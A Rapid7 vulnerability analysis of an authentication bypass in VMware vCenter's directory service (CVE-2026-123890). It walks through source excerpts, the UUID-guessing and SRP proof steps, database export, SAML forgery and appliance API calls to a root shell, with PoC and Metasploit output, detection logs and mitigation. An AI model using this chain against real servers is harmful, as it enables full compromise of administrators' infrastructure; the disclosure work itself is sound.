---
title: Rapid7
author: Jack Heysel
url: https://www.rapid7.com/blog/post/ra-rapid7-analysis-vmware-vcenter-srp-authentication-bypass-to-root-cve-2026-123890/
hostname: rapid7.com
description: An unauthenticated attacker can retrieve the session key for an in-progress administrator login to VMware vCenter's directory service. The attacker then uses that key to complete the login without knowing the account's password. The vulnerable interface is exposed through DCE/RPC on TCP port 2012.
sitename: Rapid7
date: "2026-11-24"
categories: ['Vulnerabilities and Exploits']
tags: ['cybersecurity company', 'managed detection and response', 'exposure management', 'managed security solutions', 'vulnerability management', 'exposure assessment platform']
fingerprint: "2419c78813ab4f85"
language: en
image: https://www.rapid7.com/cdn/images/bltcbf09ec3af35e28e/6a15c63f08221ed5144dbf77/webinar-rapid7-logo.jpg
pagetype: website
filedate: "2026-11-25"
---
## Overview

An unauthenticated attacker can retrieve the session key for an in-progress administrator login to VMware vCenter's directory service. The attacker then uses that key to complete the login without knowing the account's password. The vulnerable interface is exposed through DCE/RPC on TCP port 2012.

The issue, tracked as [CVE-2026-123890](https://www.cve.org/CVERecord?id=CVE-2026-123890), combines a Secure Remote Password (SRP) session-key getter that is callable before authentication with an RPC context lookup that does not enforce ownership. The context handles use predictable UUIDv1 values. By creating two reference contexts around a pending login, an attacker can narrow the hidden login handle to a short timestamp window and ask the server for its key.

We reproduced the bypass against vCenter Server Appliance **8.0.2.00400, build 23929136**, running Photon OS 4.0, and leveraged the resulting administrator connection through to root command execution. SSH and Bash access were initially disabled. The attack recovered the directory database and its Security Token Service (STS) signing key, forged an administrator API session, and used appliance administration features to create an account and enable SSH. Neither the existing SSO password nor the root password was an input to that chain.

## Impact

The attacker needs network access to TCP 2012 and the name of an existing SSO principal. Our PoC uses the default SSO administrator principal, [\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection); deployments using a different SSO domain need the corresponding account name. The attack does not depend on an existing authenticated connection or an administrator being online. The attacker initiates the login attempt in order to recover its session key.

The authenticated connection can call the directory database-copy interface. Its raw database contains the STS private signing key, allowing the attacker to sign administrator assertions that vCenter trusts. Our attack workflow used a forged assertion to create a local appliance superAdmin account, enable SSH and Bash, and execute commands as root through sudo. This final part requires access to the HTTPS API on TCP 443 and SSH on TCP 22, in addition to TCP 2012. It uses the administrative privileges obtained through the original bypass; no second vulnerability is needed once you have administrative RPC access.

## Technical Analysis

### Returning the key before checking the proof

```cpp
// vmdir/server/vmdir/rpcsrpserv.c
 long Srv_rpc_srp_verifier_get_session_key( handle_t hServer, srp_verifier_handle_t hSrp, rpc_p_srp_bytes_container ret_key_cont) {
// ...
 struct SRPVerifier ver = (struct SRPVerifier *) hSrp; //[A1] rpc_p_srp_bytes_container key_cont = NULL;
if (!ver)
{
    sts = rpc_s_invalid_handle;
    goto error;
}
key = srp_verifier_get_session_key(ver, &key_len);     // [A2]
if (!key || key_len == 0)
{
    sts = rpc_s_auth_nokey;
    goto error;
}
sts = _srp_bytes_container_allocate(key, key_len, &key_cont);
if (sts)
{
    goto error;
}
*ret_key_cont = key_cont;                             // [A3]
// ...
}
```
The [SRP RPC getter](https://raw.githubusercontent.com/vmware-archive/lightwave/ae9394723396ebd79c35753da34dc7483fee3d5f/vmdir/server/vmdir/rpcsrpserv.c) receives an SRP verifier at \[A1\], obtains its session key at \[A2\], and returns a copy at \[A3\]. It checks whether the verifier and key exist. It does not check whether the caller has authenticated, whether the caller owns the verifier, or whether the SRP client has supplied a valid password proof.

The value at \[A1\] is a server-side pointer that the RPC runtime resolves from the context handle supplied in the request. Each newly created verifier context receives its own UUID, so the attacker needs the handle for the specific pending login they want to complete. These context UUIDs identify individual verifier instances; the fixed interface UUIDs identify the available RPC interfaces.

UUIDv1 values contain a timestamp, clock sequence, and node identifier. The attacker creates a verifier immediately before starting the target login and another immediately afterward, obtaining both reference UUIDs without authenticating. On the tested service, the reference UUIDs share their clock sequence and node identifier. The attacker reuses those fields and searches the intervening timestamps for the pending login's live verifier, keeping the login connection open throughout the search.

```cpp
// vmdir/thirdparty/csrp/srp.c 
int srp_verifier_is_authenticated(struct SRPVerifier *ver)
{
    return ver->authenticated; // [A4]
}
// ...
const unsigned char *srp_verifier_get_session_key(
    struct SRPVerifier *ver, int *key_length)
{
    if (key_length)
        *key_length = hash_length(ver->hash_alg);
    return ver->session_key; // [A5]
}
```
The [underlying SRP library](https://raw.githubusercontent.com/vmware-archive/lightwave/ae9394723396ebd79c35753da34dc7483fee3d5f/vmdir/thirdparty/csrp/srp.c) exposes the authentication flag separately at \[A4\]. Its key getter at \[A5\] does not consult that flag. The server has already computed the shared key while generating its challenge, because it needs that key to verify the client's proof. Returning it at this stage gives the client the secret needed to produce that proof.

### Resolving another connection's context

```cpp
// dcerpc/idl_lib/ctxeectx.c
void rpc_ss_ee_ctx_from_wire(
    ndr_context_handle *p_wire_context,
    rpc_ss_context_t *p_context,
    volatile error_status_t *p_st)
{
    // ...
    p_uuid = &p_wire_context->context_handle_uuid; // [B1]
    // ... nil-handle check and table lock ...
    this_link = &context_table[dce_uuid_hash(p_uuid,
        (error_status_t *)p_st) % CALLEE_CONTEXT_TABLE_SIZE]; // [B2] 
    while (!dce_uuid_equal(p_uuid, &this_link->uuid,
        (error_status_t *)p_st))
    {
        this_link = this_link->next_context;
        // ... reject a missing entry ...
    }
    *p_context = this_link->user_context; /* [B3] */
    // ...
}
```
The [RPC runtime](https://raw.githubusercontent.com/vmware-archive/likewise-open/b215ef8c6a18c0f000ed1146d43b7a2478d9213a/dcerpc/idl_lib/ctxeectx.c) takes the supplied UUID at \[B1\], searches a process-wide table at \[B2\], and returns the associated context at \[B3\]. There is no comparison with the requesting connection or its authenticated identity. Although context creation records a client for lifetime management, that client is not part of this lookup's authorization decision (hooray!!).

We confirmed the boundary directly: one anonymous RPC connection created an SRP verifier, and a second anonymous connection retrieved that verifier's key before any password proof was sent. The first connection's context handle was enough to make the second connection's request succeed.

The service registers the helper with a secure-interface flag and an authentication callback. On the tested TCP path, however, the RPC executor retrieves those registration values and dispatches the server stub without enforcing the callback. Other directory handlers perform their own access checks. The SRP key getter has no equivalent check, leaving it reachable before authentication.

### Predictable handles make the lookup usable

```cpp
// dcerpc/uuid/uuidsys.c
void uuid__get_os_time(dce_uuid_time_t *uuid_time)
{
    // ...
    if (gettimeofday(&tp, (struct timezone *)0))           // [C1]
    {
        perror("uuid__get_os_time");
        exit(-1);
    }
    uuid__uemul((long)tp.tv_sec, UUID_C_100NS_PER_SEC, &utc);
    uuid__uemul((long)tp.tv_usec, UUID_C_100NS_PER_USEC, &usecs); // [C2]
    UADD_UVLW_2_UVLW(&usecs, &utc, &utc);
    // ... add the UUID epoch offset ...
```
The [UUID timestamp generator](https://raw.githubusercontent.com/vmware-archive/likewise-open/b215ef8c6a18c0f000ed1146d43b7a2478d9213a/dcerpc/uuid/uuidsys.c) reads the wall clock at \[C1\] and converts its microseconds into 100-nanosecond UUID ticks at \[C2\]. The resulting UUIDv1 handle also contains a clock sequence and node identifier. In our captures, those latter fields remain stable while newly created contexts advance through the timestamp space.

vmdir manages this SRP authentication exchange through the Generic Security Service API (GSS-API), which provides a common interface for authentication mechanisms. Starting the login creates an SRP verifier internally, but the login client does not receive its context handle.

An attacker can obtain reference handles by creating ordinary SRP verifiers through the helper interface. Creating one immediately before the GSS-API login and another immediately afterward bounds the timestamp of its hidden verifier. The shared node and clock-sequence fields then let the attacker construct candidate UUIDs within that interval.

The default search advances in increments of ten UUID ticks, matching the clock's microsecond resolution. The generator also supports uniqueness adjustments within a clock tick, so the PoC includes a one-tick search mode. Clock changes, concurrent activity, and the chosen search bounds can affect recovery; exhausting the window does not establish that a target is patched.

## Exploit

### Narrowing the Search Window for a Pending Login

The service exposes two relevant RPC interfaces on port 2012:

| **Interface** | **UUID** | **Operations used** | 
|---|---|---|
| SRP verifier helper | c7e94609-6ab0-4767-8e92-b6485bff1649 | Create verifier, retrieve key, delete verifier | 
| vmdirdbcp | 72c780fe-af6b-42ba-9b02-f61f4ccc98ed | SRP-authenticated bind, directory state, and database open/read/close | 

The helper's operation numbers are 0 for verifier creation, 1 for key retrieval, and 4 for deletion. GetState is operation 4 on the separate vmdirdbcp interface. The interface UUID is therefore part of identifying an operation; the operation number alone is ambiguous.

The client first creates a reference verifier, starts a separate SRP login as the target principal (e.g. [\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection)), and creates the second reference verifier. It keeps the login connection open while querying candidate handles over another anonymous connection. These are all connections controlled by the attacker.

GSS does not return the handle for its own verifier. A reference verifier for the same principal has a different session key, so retrieving that reference key does not complete the pending GSS login. We need the key from the verifier associated with the login connection; the reference handles only narrow the search for it.

In the final standalone PoC test, the reference handles were:

```html
Before: 1d98c67a-e468-11f1-b101-000c29451b35
Hidden: 1d99c43a-e468-11f1-b101-000c29451b35
After:  1d9a8a14-e468-11f1-b101-000c29451b35
```
The interval between the reference timestamps was 115,610 UUID ticks, or about 11.56 milliseconds. The search recovered the hidden handle shown above after 5,083 queries. Four workers issued the queries in that Python test, so the count includes requests that were already in flight when the match was found.

The SRP verifier helper returns the pending login's actual 20-byte session key. The attack does not need a weak password, a password hash from disk, or an invalid SRP public value.

### Completing SRP with the disclosed key

```html
M1   = SHA1((SHA1(N) XOR SHA1(g)) || SHA1(I) || s || A || B || K)
HAMK = SHA1(A || M1 || K)
```
Here, I is the requested principal, N and g are the SRP group parameters, s is the server's salt, and A and B are the public values exchanged during login. The server sends s alongside B in its initial SRP challenge, before the client supplies a password proof. The salt is public: a legitimate client uses it with the password to derive the values needed for authentication.

The client already has all of these inputs except K. Once the key getter supplies K, the client can calculate the normal client proof, M1, and verify the server's response, HAMK.

The attack does not need a weak password, a password hash from disk, or an invalid SRP public value. Our client uses the valid public value A = 2 in the normal 2048-bit group. The reference verifiers use the cheaper 1024-bit group only to obtain the timing bounds.

The implementation hashes minimal big-endian integer representations. On the tested build, the returned B is 276 bytes because CSRP serializes k\*v + g^b without first reducing the sum modulo N. Reducing or truncating that returned value while building the transcript produces the wrong proof.

The successful mechanism on this build is the legacy SRP OID 1.2.840.113554.1.2.10. Its token framing also differs from a conventional GSS wrapper: the outer length covers the OID, with the SRP state token following it. The client carries the exchange in SPNEGO bind and ALTER\_CONTEXT messages, using RPC packet privacy. Matching that framing is necessary to reach the vulnerable authentication flow.

### Proving the authenticated connection

The client derives packet-protection keys from the recovered SRP key using the server's normal implementation. PBKDF2-HMAC-SHA1 expands the key into 64 bytes using the principal as salt and 128 iterations. Those bytes supply an IV, material for the Kerberos AES-256 string-to-key operation, and a 16-byte HMAC key. RPC stubs are encrypted with AES-CBC and authenticated with HMAC-SHA1 over the ciphertext.

PoC output:

```html
{"time": "2026-11-19T22:25:25.919835+00:00", "event": "session_key_disclosed", "uuid": "1d99c43a-e468-11f1-b101-000c29451b35", "key": "1f1476617a050b8e30388e0f58ed80d83f01aa02", "guesses": 5083, "seconds": 0.8774298130301759}
{"time": "2026-11-19T22:25:25.952425+00:00", "event": "srp_authentication_complete", "username": "
```
[\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection)", "M1": "af03ad96cb799381bf8e9a30a412b4371e24729d", "HAMK": "537b2d5753f213304824551077bddd51ed6693ae", "password_supplied": false}
{"time": "2026-11-19T22:25:26.226964+00:00", "event": "protected_rpc_result", "operation": "RpcVmDirGetState", "state": 3, "status": 0, "plaintext": "0300000000000000"}
We used RpcVmDirGetState to test the resulting connection to 192.168.1.81. An anonymous request returned status 5, ACCESS\_DENIED. The authenticated request above returned 0300000000000000: the little-endian directory state, 3 (Normal), followed by the operation's success status, 0. The PoC checked the server's SRP proof and the encrypted response's MAC before accepting the result.

Key recovery took approximately 0.88 seconds in this run. The complete test retained the original RPC traffic and a packet capture with 15,343 packets and zero kernel drops. 

This brings us to the end of exploiting CVE-2026-123890. We have demonstrated how we can authenticate to VMware vCenter's directory service as the administrator user and will now outline how that access can be used to get root access to the device.

### Reading the directory database

vmdir/server/vmdir/rpcserv.c, Srv\_RpcVmDirOpenDatabaseFile:

```cpp
// vmdir/server/vmdir/rpcserv.c
UINT32 Srv_RpcVmDirOpenDatabaseFile(
    handle_t hBinding,
    PWSTR pwszDBFileName,
    vmdir_dbcp_handle_t *ppFileHandle)
{
    // ...
    DWORD dwRpcFlags = VMDIR_RPC_FLAG_ALLOW_TCPIP
                       | VMDIR_RPC_FLAG_REQUIRE_AUTH_TCPIP
                       | VMDIR_RPC_FLAG_REQUIRE_AUTHZ;
    // ...
    dwError = _VmDirRPCCheckAccess(hBinding, dwRpcFlags,
        pszDomainDn, &pAccessToken);                      // [D1]
    BAIL_ON_VMDIR_ERROR(dwError);
    // ... validate arguments and convert the filename ...
    dwError = _VmDirRemoteDBCopyWhiteList(pszDBFileName);  // [D2]
    BAIL_ON_VMDIR_ERROR(dwError);
    // ...
    if ((pFileHandle = fopen(pszDBFileName, "rb")) == NULL)
    {
        // ... report the open failure and take the error path ...
    }
    *ppFileHandle = pFileHandle;                          // [D3]
    // ...
```
The [database-copy handler](https://raw.githubusercontent.com/vmware-archive/lightwave/ae9394723396ebd79c35753da34dc7483fee3d5f/vmdir/server/vmdir/rpcserv.c) requires authentication and authorization at \[D1\]. The earlier bypass satisfies those checks as the SSO administrator. The filename passes a database-path allowlist at \[D2\], and the handler returns a file context at \[D3\]. We requested /storage/db/vmware-vmdir/data.mdb through that interface.

The [IDL](https://raw.githubusercontent.com/vmware-archive/lightwave/ae9394723396ebd79c35753da34dc7483fee3d5f/vmdir/idl/vmdirdbcp.idl) assigns operation 0 to open, 1 to read, and 2 to close. The open request carries a reference wide string and an initially empty context handle. Each read supplies the returned context, a byte count, and an empty output container. Reads continue until the server returns a zero byte count.

Our first complete export contained 16.22 MB. We used 2,048-byte reads so the response, encryption padding, and verifier fit into a single RPC fragment. The directory stayed in state 3, Normal; we did not call RpcVmDirSetBackendState or take the service offline. These calls copy the live file rather than producing a transaction-consistent backup. The downloaded file contained the signing credential needed for the next step.

### Signing an administrator API assertion

The TenantCredential-1 record in data.mdb contains the STS RSA private key and its certificate chain. Metasploit already provides extraction and SAML-signing code in vcenter\_offline\_mdb\_extract and vcenter\_forge\_saml\_token. We reused those implementations, matched the signing certificate to the recovered private key, and verified its VMCA issuer.

The signed assertion identifies [\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection) and carries the existing template's administrator group claims, including SystemConfiguration.Administrators. The issuer uses the appliance's STS identity, and the assertion includes a short validity window. Once the XML is signed, changing its whitespace can invalidate the digest, so the client preserves its compact serialization.

lib/msf/core/exploit/remote/http/vmware\_vcenter.rb, API login:

```html
token = Base64.strict_encode64(Zlib.gzip(assertion))        # [E1]
response = vcenter_api_request(
  'POST', %w[com vmware cis session], port: port, host: host,
  headers: { 'Authorization' => "SIGN token=\"#{token}\"" }
)
session_id = vcenter_api_value(response)                   # [E2]
```
The client gzip-compresses and Base64-encodes the assertion at \[E1\], following the [vendor REST SDK's SAML login example](https://github.com/vmware-archive/vsphere-automation-sdk-rest/blob/master/samples/postman/vSphere-Automation-REST-Resources.postman_collection.json). A successful POST /rest/com/vmware/cis/session returns the API session ID at \[E2\]. Subsequent requests carry it in the vmware-api-session-id header. Our forged assertion returned HTTP 200 and authorized reads of the appliance's SSH and Bash settings.

### From the appliance API to root

The authenticated API session gives us a way to create credentials that SSH will accept. We created a fresh local account through the [appliance local-accounts API](https://developer.broadcom.com/xapis/vsphere-automation-api/latest/api/appliance/local-accounts/post/), assigning the superAdmin role. This is an operating-system account on the appliance; creating it does not require changing an existing account's password.

The tested build accepts the account-creation request through the legacy REST route POST /rest/appliance/local-accounts/\<username>, with its configuration inside a config object. The configuration supplies the generated password, roles: \["superAdmin"\], and enabled: true. The same API session enables SSH with PUT /rest/appliance/access/ssh and {"enabled":true}, then enables Bash with PUT /rest/appliance/access/shell and {"config":{"enabled":true,"timeout":600}}.

/etc/sudoers.d/applmgmt on the tested appliance:

`%superAdmin ALL= PASSWD: ALL, NOPASSWD: OPERATOR_N, ADMINISTRATOR_N`
That sudo rule allows the new account to run commands as root using its own generated password. An SSH login initially enters the appliance CLI, so the client requests a PTY and starts shell /bin/bash. After answering the appliance's sudo password prompt, it starts sudo -n /bin/bash -i on the same terminal. The sudo timestamp from that authentication permits the retained root shell.

We verified uid=0(root) gid=0(root) groups=0(root),4044(shellaccess) through the resulting SSH connection. This account and password were created by the forged API session; the supplied lab root credentials were used separately for inspection and were not used to obtain this shell. 

Using the sessions in Metasploit

```html
[*] 192.168.1.81:2012 - Recovered the pending session key after 17337 guesses in 8.12 seconds
[*] 192.168.1.81:2012 - Recovered context 688f5878-e487-11f1-b101-000c29451b35, key f56a33e23fad8b8d340c8ca0887aebe1fb793bab
[+] 192.168.1.81:2012 - Authenticated as 
```
[\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection) without a password; protected directory state: 3
[+] 192.168.1.81:2012 - Saved authentication evidence to /Users/jheysel/codex_research/vsphere_armory_castle_20261119/metasploit/config/loot/20261119190933_default_192.168.1.81_vmware.vmdir.srp_059381.json
[*] VMware directory RPC session 3 opened (192.168.1.70:61547 -> 192.168.1.81:2012) at 2026-11-19 19:09:34 -0700
[*] 192.168.1.81:2012 - Interacting with vmdir session 3; use background to return to msfconsole
vmdir > whoami
Authenticated SSO principal: [\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection)
vmdir > state
Directory state: 3
vmdir > state
Directory state: 3
The Metasploit module separates the inexpensive key-disclosure check from the full authentication attempt. check creates an owned verifier and asks for its key through a second anonymous association. run then performs the pending-login search, completes SRP, and verifies the protected operation.

The module's default RPC action retains the authenticated association and exposes a vmdir > prompt with state and whoami commands. Selecting ACTION SHELL continues through database export, SAML API authentication, and SSH to a root command shell. The fresh end-to-end test produced the following output:

```html
[+] 192.168.1.81:2012 - Root execution verified: uid=0(root) gid=0(root) groups=0(root),4044(shellaccess)
[*] Command shell session 1 opened (192.168.1.70:62059 -> 192.168.1.81:22) at 2026-11-20 07:48:25 -0700
...
[*] 192.168.1.81:2012 - Interacting with shell session 1; use background to return to msfconsole
...
root [ /home/sebastian-fritsch ]# id
uid=0(root) gid=0(root) groups=0(root),4044(shellaccess)
```
CreateSession defaults to true for either action. We resumed the root shell and ran id to show root access before exiting.

The shell action saves the generated account credentials and original SSH/Bash settings before changing the appliance. It retains the temporary account and access settings while the session is open. On exit, it closes SSH, restores the original settings, and deletes its account through the API. The order matters: the appliance refuses to delete an account that still has running processes, and disabling SSH terminates active connections. Closing the console abruptly can prevent cleanup; the saved recovery details identify the account and settings to restore.

## Detection opportunities

The unauthenticated key queries are visible before the client establishes packet privacy. Useful network evidence includes repeated calls to operation 1 on the SRP helper interface, with no RPC authentication verifier and context UUIDs that differ mainly in their timestamp fields. In our reproduction, those queries occur between the pending login's initial bind and its SRP proof continuation.

The helper interface UUID, operation number, authentication state, query volume, and UUID pattern are useful together. A connection to port 2012 or an administrator SRP login on its own does not establish exploitation.

The appliance also retains evidence of the database export and subsequent administration. We recovered the following records from the same vCenter 8.0.2.00400 appliance after the test accounts had been removed.

/var/log/vmware/vmdird/vmdird-syslog.log:

`2026-11-20T14:45:46.792144+00:00 info vmdird  t@140450245629504: Remote DB transfer (/storage/db/vmware-vmdir/data.mdb) granted.`

The directory service records this message when its filename allowlist grants a remote database-copy request. It identifies the requested database, but does not include the caller's address or prove that the transfer completed. An unexpected grant for data.mdb provides a timestamp to correlate with network traffic and the later API activity; legitimate directory replication can also use this interface. The SRP bypass can occur without a database-copy request, so this entry identifies the export stage.

/var/log/vmware/vapi/endpoint/endpoint-access.log:

`2026-11-20T14:48:08.065Z | vAPI-I/O dispatcher-0     | e97ae44e-a503-4b58-9b68-1168c80e89c6 | 192.168.1.70 - - [20/Nov/2026:14:48:07 +0000] "POST /rest/appliance/local-accounts/sebastian-fritsch HTTP/1.1" 200 0 "-" "Mozilla/5.0 (iPad; CPU OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1" 233`
The API access log records the source address, request path, status, and user-agent. This request creates the account used by the root-shell stage. The same file contains our POST /rest/com/vmware/cis/session, PUT /rest/appliance/access/ssh, PUT /rest/appliance/access/shell, and eventual account-deletion requests. An HTTP 200 on a settings request does not reveal which value was applied, so the appliance management log supplies the next part of the sequence.

/var/log/vmware/applmgmt/applmgmt.log:

`2026-11-20T14:48:07 PM UTC [47843]INFO:vmware.appliance.localaccounts.localaccounts_impl:`[\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection) created the local account user sebastian-fritsch
2026-11-20T14:48:09 PM UTC [47843]DEBUG:root:com.vmware.appliance.version1.access.ssh.set(enable=True)
2026-11-20T14:48:10 PM UTC [47843]DEBUG:root:com.vmware.appliance.version1.access.shell.set(config=Structure('ShellConfig', dict(enabled=True, timeout=600)))
2026-11-20T14:49:34 PM UTC [47843]INFO:vmware.appliance.localaccounts.localaccounts_impl:[\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection) deleted the local account  user sebastian-fritsch.
These records identify [\[email protected\]](https://www.rapid7.com/cdn-cgi/l/email-protection) as the account creator and show SSH and Bash being enabled. The configuration values appear in DEBUG-level records on the tested appliance; the account creation and deletion records are INFO-level. The forged SAML session is treated as an administrator session, so that identity alone does not distinguish it from legitimate administration.

/var/log/audit/sshinfo.log.1.gz, decompressed:

```html
2026-11-20T14:48:12.368544+00:00 node-1w7jr9qrllzwd9vncrrr8zlf9 sshd[592859]: Accepted password for sebastian-fritsch from 192.168.1.70 port 62059 ssh2
2026-11-20T14:48:17.298091+00:00 node-1w7jr9qrllzwd9vncrrr8zlf9 sudo: sebastian-fritsch : TTY=pts/0 ; PWD=/home/sebastian-fritsch ; USER=root ; COMMAND=/bin/bash -i
2026-11-20T14:49:34.208901+00:00 node-1w7jr9qrllzwd9vncrrr8zlf9 userdel[593806]: delete user 'sebastian-fritsch'
```

The SSH and sudo records tie the new account to the API client's address and a root Bash shell. They also retain the deletion performed during cleanup. Search sshinfo.log and its rotated copies; these entries had moved into sshinfo.log.1.gz by the time we collected them. Matching records are also available through the system journal.

/var/log/audit/audit.log:

```html
type=EXECVE msg=audit(1795186087.886:3732): argc=6 a0="/usr/sbin/useradd" a1="-m" a2="-G" a3="superAdmin" a4="--" a5="sebastian-fritsch"
type=EXECVE msg=audit(1795186097.286:3767): argc=4 a0="sudo" a1="-n" a2="/bin/bash" a3="-i"
```

Linux audit records preserve the command arguments for adding the user to superAdmin and invoking sudo -n /bin/bash -i. These examples come from a rotated audit log. They remain available after the account and its home directory are removed, subject to log retention.

For this reproduced path, correlate an unexpected database-transfer grant with creation of a local administrator, SSH/Bash enablement, and an SSH login followed by sudo. The database-copy grant appears at 14:45:46 UTC, account creation at 14:48:07, and the root-shell command at 14:48:17. These are administrative operations that can occur legitimately; their sequence and whether they fit expected activity determine their value as indicators. The account name, source address, user-agent, UUIDs, and session values shown here belong to our lab run and are not fixed attacker identifiers.

## Mitigation

Broadcom identifies **vCenter 8.0 U3m** as the fixed release for the 8.0 branch in [VMSA-2026-0009 and its accompanying FAQ](https://raw.githubusercontent.com/vmware/vcf-security-and-compliance-guidelines/main/security-advisories/vmsa-2026-0009/README.md). Other release branches have their own guidance. Apply the vendor's supported update for the deployed product and keep the directory-service management interfaces reachable only by the systems that need them.

The failed boundary spans both the SRP helper and the RPC runtime: a pending authentication key is exposed, and a connection can resolve a context that it does not own. Replacing predictable UUIDs alone leaves that ownership problem in place. We did not compare the vendor's fixed binaries, so this analysis does not attribute a particular code change to the patch.
